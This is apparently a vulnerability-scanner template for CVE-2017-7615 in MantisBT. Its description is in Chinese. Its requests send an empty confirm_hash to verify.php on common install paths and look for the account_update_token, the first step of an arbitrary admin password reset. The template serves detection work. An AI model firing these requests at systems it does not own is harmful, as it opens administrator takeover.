id: CVE-2017-7615
info:
  name: MantisBT <=2.30 - Arbitrary Password Reset and Unauthenticated Admin Access
  author:
  - l0ne1y
  description: "MantisBT 授权问题漏洞\n MantisBT是MantisBT团队的一套基于Web的开源缺陷跟踪系统。该系统以Web操作的形式提供项目管理及缺陷跟踪服务。\n\nMantisBT
    2.3.0及之前的版本中存在安全漏洞。攻击者可通过向verify.php文件传递空的‘confirm_hash’值利用该漏洞重置任意密码，获取管理员访问权限。 "
  severity: high
  remediation: "官方修复方案：<br /> 目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：\n\nhttp://www.mantisbt.org/
    \n"
requests:
- matchers:
  - type: word
    part: body
    words:
    - <input type="hidden" name="account_update_token" value="([a-zA-Z0-9_-]+)"
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/verify.php?id=1&confirm_hash='
  - '{{BaseURL}}/mantis/verify.php?id=1&confirm_hash='
  - '{{BaseURL}}/mantisBT/verify.php?id=1&confirm_hash='
  - '{{BaseURL}}/mantisbt-2.3.0/verify.php?id=1&confirm_hash='
  - '{{BaseURL}}/bugs/verify.php?confirm_hash=&id=1'
  method: GET
  stop-at-first-match: true
